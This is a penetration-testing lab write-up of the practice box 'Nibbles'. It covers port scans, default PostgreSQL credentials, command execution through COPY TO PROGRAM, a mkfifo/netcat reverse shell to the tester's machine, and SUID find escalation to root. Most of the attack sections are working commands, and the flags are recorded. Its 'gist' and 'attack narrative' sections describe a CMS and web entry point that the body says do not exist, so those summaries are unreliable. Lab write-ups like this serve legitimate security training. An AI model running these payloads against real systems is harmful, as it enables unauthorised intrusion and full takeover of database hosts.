---
tags: [oscp, boxes, pg-practice, linux, completed]
platform: PG Practice
os: Linux
hostname: nibbles
difficulty: Easy
ip: $BoxIP
status: Complete
local_flag: 2fe8bd41588725cf3cedb4689bc8937d
root_flag: fc2033af2f11d5f1809dad1734d7764b
---

# PG: Nibbles, Full Walkthrough

## The gist

Nibbles is an authorized practice target. The verified route is documented below, from initial enumeration through the final privilege boundary and clean-down. The source notes establish this route: 1. [[RUNBOOK V2/Linux - Web Enum]] mapped the web paths and exposed the application entry point. 2. [[RUNBOOK V2/Linux - CMS Check]] identified the CMS and its version-specific attack surface. 3. [[RUNBOOK V2/Linux - Database Access]] used the recovered application data to support the foothold. 4. [[RUNBOOK V2/Linux - SUID Check]] found the privileged binary that completed escalation.

## Box information

| Field | Value |
|---|---|
| Platform | PG Practice |
| OS | Linux |
| IP | $BoxIP |
| Difficulty | Easy |
| Status | Root |

---

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Recon | See section 1 below |
| 2 | Service Triage | See section 2 below |
| 3 | Foothold | See section 3 below |
| 4 | Privilege Escalation | See section 4 below |
| 5 | Decision points and alternate routes | See section 5 below |
| 6 | Vulnerabilities / Techniques | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/Offsec/Nibbles`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

```bash
boxset BoxName Nibbles
boxset BoxIP "$BoxIP"
boxset LocalIP "$LocalIP"
boxset BoxDir "$BoxDir"
```

## 1. Recon

### Port Scan

```bash
sudo nmap -p- --min-rate 10000 -oN allports.nmap $BoxIP
```

Open ports:

| Port | Service |
|---|---|
| 21/tcp | vsftpd 3.0.3 |
| 22/tcp | OpenSSH 7.9p1 Debian |
| 80/tcp | Apache 2.4.38 |
| 5437/tcp | PostgreSQL 11.3-11.9 |

Closed: 139, 445 (SMB ports closed, not worth pursuing).
UDP: all 100 top ports filtered -- nothing useful.

`shot nmap-allports`

### Service Scan

```bash
sudo nmap -sV -sC -p 21,22,80,5437 -oN services.nmap $BoxIP
```

Key finding: PostgreSQL on non-standard port 5437 with SSL cert `commonName=debian`. Default port is 5432 -- someone moved it but left it world-accessible.

> [!warning] 💡 Hint
> A database on a non-standard port is still a primary lead when it is externally reachable. Record the exact port and version, then test authentication and capabilities rather than assuming the web service must be the entry point.

> [!tip] ⚡ More efficient path
> The service scan already identifies PostgreSQL, so move directly to a controlled credential test. Avoid spending time on closed SMB ports or blind web fuzzing after the HTTP response has shown no application.

`shot nmap-services` (red box: `5437/tcp open postgresql PostgreSQL DB 11.3 - 11.9`)

---

## 2. Service Triage

### FTP -- Anonymous Login

```bash
ftp $BoxIP
# user: anonymous, pass: <blank>
```

Result: `530 Login incorrect` -- anonymous FTP disabled.

### HTTP -- Port 80

```bash
curl -s http://$BoxIP/
```

Bare HTML template placeholder -- literally the stock "Enter a title" Apache demo page. No CMS, no web app, no useful paths. Dead end.

### PostgreSQL -- Port 5437

Primary target. Default credentials:

```bash
psql -h $BoxIP -p 5437 -U postgres
# Password: $Password
```

Connected. `postgres=#` prompt received.

`shot postgres-access` (red box: `postgres=#` prompt)

`loot cred postgres $Password`

> [!abstract] 🧠 Why
> Default credentials are useful because they give both authentication and a capability to test. The important follow-up is not merely “login worked,” but whether the database account is a superuser and can invoke an operating-system command primitive.

---

## 3. Foothold

### Confirm Superuser

```sql
SELECT current_setting('is_superuser');
```

Output: `on` -- superuser confirmed. Required for `COPY TO PROGRAM`.

`shot postgres-superuser` (red box: `on`)

### RCE via COPY TO PROGRAM

`COPY TO PROGRAM` passes the command string to `/bin/sh`. On Debian, `/bin/sh` is `dash` -- bash-specific syntax like `>&` and `/dev/tcp` will fail.

> [!abstract] 🧠 Why
> PostgreSQL executes the command through the target's system shell. A payload that works in an interactive Bash prompt can fail before it reaches the network if `/bin/sh` parses it. Separate command execution, egress, and shell syntax as three different tests.

> [!warning] 💡 Hint
> **Watch out:** PostgreSQL launches the command through the system shell, not automatically through Bash. Use shell-compatible syntax or explicitly invoke an available shell.

**Troubleshooting (for the notes):**

| Attempt | Error | Reason |
|---|---|---|
| `bash -c "bash -i >& /dev/tcp/..."` | exit code 1 | `/dev/tcp` not available or bash compile option missing |
| `bash -i >& /dev/tcp/...` | exit code 2 | `>&` is bash syntax, `/bin/sh` is dash, syntax error |
| mkfifo + nc on port 443 | exit code 1 | TCP egress filtered on 443 (PG Practice pattern) |

**Confirm RCE works (ping test):**

```sql
COPY (SELECT '') TO PROGRAM 'ping -c 4 $LocalIP';
```

Watch with `tcpdump -i tun0 icmp` on Kali. ICMP arrived -- COPY TO PROGRAM executes fine. Egress filtering is the issue, not the command.

**Check available tools (COPY FROM PROGRAM pattern):**

```sql
CREATE TABLE cmd_out (output text);
COPY cmd_out FROM PROGRAM 'ls /usr/bin/python* /usr/bin/perl /usr/bin/nc* /bin/nc* 2>/dev/null; echo done';
SELECT * FROM cmd_out;
DROP TABLE cmd_out;
```

Found: nc, nc.traditional, perl, python, python2, python3. nc IS installed -- port 443 is blocked.

**Working payload (port 80 bypasses egress filter):**

Start listener:
```bash
sudo nc -lvnp 80
```

Fire shell:
```sql
COPY (SELECT '') TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $LocalIP 80 >/tmp/f';
```

Shell received as `postgres`.

`shot foothold` (red box: `postgres@nibbles` prompt)

### Stabilise

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter
export TERM=xterm
```

---

## 4. Privilege Escalation

### SUID Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
```

Key finding: `/usr/bin/find` -- SUID set.

> [!warning] 💡 Hint
> SUID enumeration is only useful when you inspect the resulting binary list against known behavior. `find -exec /bin/bash -p` works because the root-owned SUID `find` launches Bash while preserving the effective UID.

> [!tip] 🛠️ Alternative tools
> If `find` is unavailable, review the rest of the SUID list against GTFOBins and check `sudo -l`, capabilities, scheduled tasks, and writable service files. Do not assume the database shell is already root.

`shot privesc-finding` (red box: `/usr/bin/find`)

### SUID find Exploit

```bash
/usr/bin/find . -exec /bin/bash -p \; -quit
```

Drops to `bash-5.0#` with `euid=0(root)`.

```bash
id
# uid=106(postgres) gid=113(postgres) euid=0(root)
```

`shot root-shell` (red box: `euid=0(root)`)

---

## 5. Decision points and alternate routes

| Observation | Primary route used here | Useful alternative or fallback |
|---|---|---|
| PostgreSQL is exposed on a non-standard port | Test default credentials and superuser status | Inspect SSL, roles, databases, and version-specific features |
| `COPY TO PROGRAM` works but callback fails | Prove with ping, then choose an allowed port and shell | Use `COPY FROM PROGRAM` for command output or stage an SSH credential |
| SUID `find` is present | Use `-exec /bin/bash -p` and verify `euid=0` | Check sudo, capabilities, cron, and writable service files |

The completed chain follows the database capability and the SUID finding. A failed callback is not evidence that the SQL command primitive failed.

## 6. Vulnerabilities / Techniques

| Technique | Description | Impact |
|---|---|---|
| PostgreSQL default creds | `postgres:postgres` on externally exposed port 5437 | DB superuser access |
| COPY TO PROGRAM (PostgreSQL) | Superuser SQL function executes OS commands via `/bin/sh` | RCE as postgres OS user |
| SUID find | `/usr/bin/find -exec /bin/bash -p \; -quit` | euid=0 root shell |

---

## 7. Vault Update Checklist

- [ ] Screenshots in `$BoxDir/screenshots/` (box-started, nmap-allports, nmap-services, postgres-access, postgres-superuser, foothold, privesc-finding, root-shell, user-flag, root-flag, PROOF)
- [ ] Loot: `flags.txt` (user + root), `creds.txt` (postgres:postgres)
- [ ] Log copied to `OSCP/BOXES/BOX LOGS/Nibbles.log`
- [ ] Stage notes: PostgreSQL - Initial Access (new), PrivEsc Linux - SUID (new), Port Scan - Full (+Nibbles)
- [ ] Module notes: M06 (+Nibbles), M10 (+Nibbles), M18 (+Nibbles)
- [ ] MASTER BOX LIST updated
- [ ] FAQ: COPY FROM PROGRAM tool discovery pattern, egress ping test, postgres default creds

## 8. RUNBOOK V2 Stages Used

- [[RUNBOOK V2/Linux - CMS Check]] -- technique used in this walkthrough
- [[RUNBOOK V2/Linux - Web Enum]] -- technique used in this walkthrough
- [[RUNBOOK V2/Linux - Database Access]] -- technique used in this walkthrough
- [[RUNBOOK V2/Linux - SUID Check]] -- technique used in this walkthrough

## 9. Collect the flags

Both flags collected as euid=0 root -- no need to compromise the `wilson` user separately. Root can read any file, including `/home/wilson/local.txt`.

```bash
cat /home/wilson/local.txt
cat /root/proof.txt
```

| Flag | Location | Value |
|---|---|---|
| User (local.txt) | /home/wilson/ | `2fe8bd41588725cf3cedb4689bc8937d` |
| Root (proof.txt) | /root/ | `fc2033af2f11d5f1809dad1734d7764b` |

`shot user-flag` / `shot root-flag`
`shot PROOF` (whoami + hostname + IP + root flag in one frame)

`loot flag user 2fe8bd41588725cf3cedb4689bc8937d`
`loot flag root fc2033af2f11d5f1809dad1734d7764b`

---


### Captured flag values from source loot


#### `loot/flags.txt`

```text
root: fc2033af2f11d5f1809dad1734d7764b
user: 2fe8bd41588725cf3cedb4689bc8937d
```

## 10. Clean down
Record every payload, temporary file, modified configuration, account, listener, and transfer server created during the run. Restore changed files, remove only recorded artifacts, verify their absence, and run `boxdone`.

## 11. Attack narrative in one page
1. [[RUNBOOK V2/Linux - Web Enum]] mapped the web paths and exposed the application entry point.
2. [[RUNBOOK V2/Linux - CMS Check]] identified the CMS and its version-specific attack surface.
3. [[RUNBOOK V2/Linux - Database Access]] used the recovered application data to support the foothold.
4. [[RUNBOOK V2/Linux - SUID Check]] found the privileged binary that completed escalation.

## Tools used

| Tool | Purpose |
|---|---|
| nmap | Port and service scanning |
| ftp | Anonymous login attempt |
| curl | Web recon |
| psql | PostgreSQL client - default creds + COPY TO PROGRAM |
| nc | Reverse shell listener and delivery |
| find (SUID) | Privilege escalation to euid=0 |

---

## Credentials and secrets

| Username | Password | Source | Used for |
|---|---|---|---|
| postgres | `$Password` | Default | PostgreSQL on port 5437 |

---


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Nibbles"
export BoxIP="192.168.183.47"
export BoxPlatform="Offsec"
export BoxDir="/home/kali/Platforms/Offsec/Nibbles"
export Domain=""
export DCip=""
export Username=""
export Password=""
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export WebPort="80"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `loot/creds.txt`

```text
postgres:postgres
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
Password:
Password for user postgres:
$ [12:38:20] loot flag root fc2033af2f11d5f1809dad1734d7764b
$ [12:41:16] loot flag user 2fe8bd41588725cf3cedb4689bc8937d
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on Nibbles | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

1. **PostgreSQL on non-standard ports** -- nmap shows port 5437 as `pmip6-data` by default because it doesn't know it's Postgres. The `-sV` service scan corrects this. Always run service scan, never trust the port number alone.

2. **Default `postgres:postgres` should be first try** -- externally exposed PostgreSQL almost always has default creds on OSCP-level boxes. Don't overthink it.

3. **Check superuser before assuming COPY TO PROGRAM works** -- `SELECT current_setting('is_superuser');` must return `on`. Non-superuser postgres accounts can connect but cannot execute OS commands.

4. **COPY TO PROGRAM uses `/bin/sh`, not bash** -- `>&` and `/dev/tcp` are bash-only. On Debian, `/bin/sh` is `dash`. Use mkfifo+nc or python3 for the shell payload.

5. **Diagnose egress before blaming the payload** -- ping test (`COPY TO PROGRAM 'ping -c 4 ...'`) + tcpdump tells you instantly whether the execution works and whether egress is open. If ICMP arrives but TCP shell doesn't, it's a port filtering issue, not a payload issue.

6. **COPY FROM PROGRAM for tool discovery** -- when you need to know what's on the box but don't have a shell yet, `COPY cmd_out FROM PROGRAM '...'` reads stdout into a table you can SELECT from. Must append `; echo done` or similar to guarantee exit code 0 -- COPY bails on any non-zero exit.

7. **Port 80 for egress (PG Practice pattern)** -- TCP egress is filtered on most PG Practice boxes. Ports 80 and 443 are the first to try. ICMP is always allowed. See also: [[Bratarina]], [[Pebbles]].

8. **Root grabs all flags** -- when you escalate to root before finding user flags, just `find /home -name local.txt` and read them directly. No need to pivot through intermediate users.

9. **PG Practice Nibbles vs HTB Nibbles** -- completely different boxes. PG Practice Nibbles = PostgreSQL + SUID find. HTB Nibbles = Nibbleblog 4.0.3 file upload (EDB-38489). Don't confuse them.

---

- CMS version and plugin enumeration should happen before trying broad exploit guesses.
- Always record the privilege level of a shell before choosing the next enumeration stage.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Snookums|Snookums]] -- shares a similar enumeration or escalation pattern
- [[OSCP/BOXES/WRITE UPS/Linux/Sea|Sea]] -- shares a similar enumeration or escalation pattern

## External resources

| Resource | Link | Why |
|---|---|---|
| HackTricks - PostgreSQL | https://github.com/HackTricks-wiki/hacktricks/blob/master/network-services-pentesting/pentesting-postgresql.md | COPY TO PROGRAM technique, default creds |
| PayloadsAllTheThings - PostgreSQL | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md | RCE payloads |
| GTFOBins - find SUID | https://gtfobins.github.io/gtfobins/find/#suid | `-exec /bin/bash -p` pattern |
| RevShells | https://www.revshells.com | mkfifo + nc payload reference |
| ippsec.rocks | https://ippsec.rocks/?#postgresql | HTB boxes using PostgreSQL technique |

---

## Related RUNBOOK V2 stages

- [[RUNBOOK V2/Start Here]]
- [[RUNBOOK V2/Linux - Service Scan]]
- [[RUNBOOK V2/Linux - Web Enum]]
- [[RUNBOOK V2/Linux - Shell Stabilise]]
- [[RUNBOOK V2/Linux - Local Enum]]
- [[RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
